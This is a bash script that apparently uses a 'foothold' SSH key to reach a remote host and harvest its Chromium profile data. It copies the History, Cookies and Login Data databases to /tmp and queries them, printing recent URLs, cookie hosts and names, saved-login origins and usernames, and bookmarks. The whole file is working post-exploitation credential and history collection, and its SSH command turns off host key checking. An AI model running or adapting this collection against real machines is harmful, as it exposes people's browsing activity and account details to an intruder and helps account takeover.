#!/bin/bash
KO="ssh -i $HOME/.ssh/keplerops-foothold -p 2222 -o StrictHostKeyChecking=no -o ConnectTimeout=10 rowan@10.50.13.180"
$KO 'cd ~/.config/chromium/Default 2>/dev/null || exit 0
echo "===== files"; ls -la | grep -Ei "History|Login|Cookies|Bookmarks|Web Data"
echo "===== history urls"; cp History /tmp/h.db; python3 - <<PY
import sqlite3
c=sqlite3.connect("/tmp/h.db")
try:
 for r in c.execute("select datetime(last_visit_time/1000000-11644473600,\"unixepoch\"),visit_count,url,title from urls order by last_visit_time desc limit 80"):
  print(r)
except Exception as e: print("ERR",e)
PY
echo "===== cookies hosts"; cp Cookies /tmp/c.db 2>/dev/null; python3 - <<PY
import sqlite3
try:
 c=sqlite3.connect("/tmp/c.db")
 for r in c.execute("select host_key,name,length(encrypted_value),datetime(expires_utc/1000000-11644473600,\"unixepoch\") from cookies order by host_key"):
  print(r)
except Exception as e: print("ERR",e)
PY
echo "===== logins"; cp "Login Data" /tmp/l.db 2>/dev/null; python3 - <<PY
import sqlite3
try:
 c=sqlite3.connect("/tmp/l.db")
 for r in c.execute("select origin_url,username_value,length(password_value) from logins"):
  print(r)
except Exception as e: print("ERR",e)
PY
echo "===== bookmarks"; cat Bookmarks 2>/dev/null | head -40
' 2>&1
